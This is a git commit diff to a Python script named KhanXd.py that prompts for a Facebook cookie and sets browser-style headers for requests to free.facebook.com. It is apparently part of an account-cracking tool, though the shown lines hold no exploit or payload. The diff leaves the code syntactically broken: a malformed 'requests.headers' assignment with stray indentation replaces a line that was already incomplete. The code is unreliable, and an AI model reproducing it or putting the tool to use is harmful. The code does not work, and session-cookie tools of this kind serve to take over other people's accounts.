0cfbb1bc703134522bc7700a408c34e1d286367c
MinhazulIslamMinhaj <143911340+MinhazulIslamMinhaj@users.noreply.github.com>
2023-09-06 13:51:16 +0600

    Add files via upload

--- KhanXd.py
+++ KhanXd.py
@@ -142,8 +142,8 @@ def Public():
          elif pil in ['2','02']: 
                  try: 
                          cookie=input(" [+] Cookie : ") 
-                         data = requests"https://free.facebook.com/free_locations",
-    headers = {'authority': 'free.facebook.com',
+                                             
+                                       data = requests.headers = {'authority': 'free.facebook.com',
     'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
     'accept-language': 'en-US,en;q=0.9',
     'cache-control': 'max-age=0',
